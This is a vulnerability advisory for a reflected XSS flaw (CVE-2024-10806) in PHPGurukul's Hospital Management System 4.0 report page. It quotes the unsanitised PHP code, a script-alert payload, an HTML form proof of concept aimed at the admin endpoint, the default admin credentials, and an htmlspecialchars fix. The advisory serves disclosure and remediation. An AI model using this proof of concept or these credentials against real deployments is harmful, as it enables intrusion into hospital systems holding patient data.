# CVE-2024-10806 - [XSS vulnerability] found in Hospital Management System (HMS) 4.0 - (betweendates-detailsreports.php)

Affected Project: **Hospital Management System (HMS)**

Exploit Author: Dimitris Chatzidimitris

Platform: Web/Php

Vendor: PHPGurukul

Official Website: (https://phpgurukul.com/hospital-management-system-in-php/)

Version: 4.0

Updated: 16 May 2024

Vulnerable path/file: `hms/admin/betweendates-detailsreports.php`

Injection parameter: `fromdate` , `todate`

<br />

Size: 16.7 MB

Sha256: 705263fd0533fde4c8c4d332bf943ea66de98645262cc896f415c897e824455a

<br />

## Vulnerability Description:
The parameters $fdate and $tdate are vulnerable to XSS because they accept user input from the $_POST array and output it directly to the page without any form of sanitization or encoding. This means that if a user submits HTML or JavaScript code within these fields, it will be rendered directly in the HTML output, executing any embedded JavaScript.
This allows an attacker to inject arbitrary HTML or JavaScript code leading to an XSS attack.

<br />

## Vulnerable code:
```
$fdate=$_POST['fromdate'];
$tdate=$_POST['todate'];

?>
<h5 align="center" style="color:blue">Report from <?php echo $fdate?> to <?php echo $tdate?></h5>
```

<br />

## Injection Payload Tested:

We need to set the `fromdate` and `todate` to:
```
<script>alert('XSS')</script>
```

<br />

## Execution:

When the browser parses this through a `POST` request, it executes the `<script>alert('XSS')</script>` code, resulting in a popup displaying `"XSS"`.

<br />

## Demonstration:

Below is how `betweendates-detailsreports.php` looks like:

<br />

![betweendates-detailsreports.php](https://i.postimg.cc/HnXLvmhw/1.png)

<br />

As it is a `POST` request we need to use a file `test.html` with the following content to be able to trigger the XSS popup:

```
<form method="POST" action="http://localhost/hospital/hms/admin/betweendates-detailsreports.php">
    <input type="text" name="fromdate" value="<script>alert('XSS')</script>">
    <input type="text" name="todate" value="<script>alert('XSS')</script>">
    <input type="submit" value="Submit">
 </form>
```

<br />

Then we have to open it on the browser:

For example: `file:///C:/Users/Testpc/Desktop/test.html/test.html`

<br />

![file](https://i.postimg.cc/T2gY6Rtm/2.png)

<br />

Before submitting the POST request we must be logged in:

Default login info:

Url: `http://localhost/hospital/hms/admin/index.php`

Username: `admin`
Password: `Test@12345`

After submitting the payload using POST with the vulnerable parameters `fromdate` and `todate` and the XSS payload `"><script>alert('XSS')</script>`, XSS is triggered:

![xss](https://i.postimg.cc/B6fkcG29/3.png)

then we need to click `OK` so the next POST request executed and XSS triggered.

![xss2](https://i.postimg.cc/5N2GmgQ0/4.png)


## Recommendation for Preventing XSS:

To fix this vulnerability, we must always sanitize user inputs before rendering them in the HTML. We can use functions like htmlspecialchars() in PHP to encode special characters.

<br />

Example:
```
$fdate = htmlspecialchars($_POST['fromdate'], ENT_QUOTES, 'UTF-8');
$tdate = htmlspecialchars($_POST['todate'], ENT_QUOTES, 'UTF-8');
?>
<h5 align="center" style="color:blue">Report from <?php echo $fdate ?> to <?php echo $tdate ?></h5>

```

<br />

> One Click Can Change Everything: Be Secure.
